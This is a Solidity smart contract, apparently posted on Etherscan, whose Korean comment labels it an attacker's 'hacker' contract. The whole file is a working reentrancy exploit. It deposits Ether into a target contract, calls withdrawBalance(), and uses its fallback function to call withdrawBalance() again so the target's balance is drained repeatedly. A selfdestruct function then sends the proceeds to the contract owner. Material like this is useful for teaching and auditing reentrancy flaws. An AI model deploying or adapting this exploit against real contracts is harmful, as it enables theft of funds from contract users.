/**
 *Submitted for verification at Etherscan.io on 2021-02-02
*/

// 공격자의 hacker 컨트랙트
pragma solidity ^0.4.25;


contract hacker {
    
    address owner;
    address target;
    
    modifier onlyOwner() {
        require(owner == msg.sender);
        _;
    }
    
    constructor(address _target) public {
        owner = msg.sender;
        target = _target;
    }
    
    function callAddToBalance() public payable {
        target.call
           .value(msg.value)(bytes4(keccak256("addToBalance()")));
    }
    
    function launch_attack() public{
       target.call(bytes4(keccak256("withdrawBalance()")));
    }
    function () public payable {
        target.call(bytes4(keccak256("withdrawBalance()")));
    }
    
    function getMoney() public onlyOwner {
        selfdestruct(owner);
    }
}